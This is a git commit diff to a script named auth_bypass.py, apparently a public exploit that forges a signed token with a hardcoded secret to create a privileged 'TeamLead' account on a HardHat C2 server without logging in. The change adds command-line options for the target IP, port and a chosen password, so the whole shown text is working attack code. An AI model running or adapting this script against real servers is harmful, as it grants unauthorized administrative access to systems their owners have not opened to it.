836cbe011b31f375f9fba08f584d2204eb258f02
thisisveryfunny <returnz0@proton.me>
2025-01-21 08:29:43 -0500

    Update auth_bypass.py

--- auth_bypass.py
+++ auth_bypass.py
@@ -9,10 +9,14 @@ urllib3.disable_warnings()
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--user", help="User and password that will be created", default="github.com/thisisveryfunny")
+parser.add_argument("-p", "--password", help="User and password that will be created", default="github.com/thisisveryfunny")
+parser.add_argument("-i", "--ip", help="The IP of the HardHat C2 running on", default="127.0.0.1")
+parser.add_argument("-P", "--port", help="The port of the HardHat C2 running on", default="5000")
 
 args = parser.parse_args()
 user = args.user
-rhost = '127.0.0.1:5000' # change the ip if necessary
+passwd = args.password
+rhost = f'{args.ip}:{args.port}' # change the ip if necessary
 secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
 issuer = "hardhatc2.com"
 now = datetime.now(timezone.utc)
@@ -37,13 +41,13 @@ _headers = {
 }
 
 _json = {
-    "password": user,
+    "password": passwd,
     "role": "TeamLead",
     "username": user
 }
 r = requests.post(url, headers=_headers, json=_json, verify=False)
 if r.status_code == 200:
     print("[+] User created !")
-    print("[+] Use", user, "as the username and password to login in HardHat C2!")
+    print("[+] Use", user, "as the username and", passwd, " as the password to login in HardHat C2!")
 else:
     print("[!] User creation failed.")
